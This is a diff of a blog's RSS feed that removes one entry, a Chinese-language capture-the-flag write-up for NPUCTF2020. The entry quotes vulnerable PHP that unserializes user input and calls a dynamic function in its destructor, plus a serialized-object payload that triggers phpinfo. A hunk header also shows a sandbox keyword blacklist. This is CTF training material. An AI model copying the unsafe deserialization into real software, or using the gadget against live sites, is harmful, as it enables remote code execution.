@@ -559,18 +559,6 @@ blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;,
     </item>
     
     <item>
-      <title>NPUCTF2020_wp</title>
-      <link>https://anthem-whisper.github.io/p/npuctf2020_wp/</link>
-      <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/p/npuctf2020_wp/</guid>
-      <description>查源码 F12，ctrl+U，没啥好说的
-RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
- &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
-&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?</description>
-    </item>
-    
-    <item>
       <title>Padding Oracle Attack&amp;CBC字节翻转攻击</title>
       <link>https://anthem-whisper.github.io/p/padding-oracle-attackcbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</link>
       <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
